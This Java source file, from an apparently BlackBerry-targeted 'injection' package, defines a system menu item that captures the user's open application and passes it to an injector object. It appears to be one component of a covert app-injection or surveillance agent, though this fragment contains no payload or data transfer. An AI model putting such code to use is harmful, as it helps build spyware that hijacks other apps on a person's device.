package blackberry.injection;

import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.AInjector;

public class InjectorSystemMenu extends SystemMenu {
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectSysMenu",
            DebugLevel.VERBOSE);
    //#endif
    private InjectorManager manager;
    private AInjector injector;

    private String menuName="Abort";
    
    protected String getMenuName() {
        return menuName;
    }    
    protected void setMenuName(String menuName) {
        this.menuName=menuName;
    }  
    
    public InjectorSystemMenu(InjectorManager manager, AInjector injector) {
        super(0);
        this.manager = manager;
        this.injector = injector;
        setMenuName(injector.getPreferredMenuName());
    }

    public Object run(Object context) {
        UiApplication app = UiApplication.getUiApplication();
        debug.init();
        
        //#ifdef DEBUG
        debug.trace("run on: " + app);
        //#endif

        injector.setInjectedApp(app);

        return null;
    }

}
